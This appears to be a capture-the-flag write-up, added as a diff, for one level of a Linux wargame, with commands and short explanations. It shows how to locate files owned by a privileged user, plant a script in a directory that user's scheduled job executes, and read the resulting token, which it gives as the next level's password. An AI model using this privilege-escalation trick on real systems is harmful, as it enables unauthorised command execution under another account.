@@ -1,0 +1,20 @@
+$> find / -user flag05 2>/dev/null
+
+give us files own by the user flag05
+	/usr/sbin/openarenaserver
+	/rofs/usr/sbin/openarenaserver
+
+those files are shell script who execute and remove
+and shell script in /opt/openarenaserver/ as flag05 user
+
+so we need to craft a shell script that send the getflag command to a file
+
+$> echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
+$> chmod +x /opt/openarenaserver/script.sh
+
+and wait til the task is done then read the flag file
+
+$> while [ -e /opt/openarenaserver/script.sh ]; do sleep 1; done; cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+this token is the level06's password
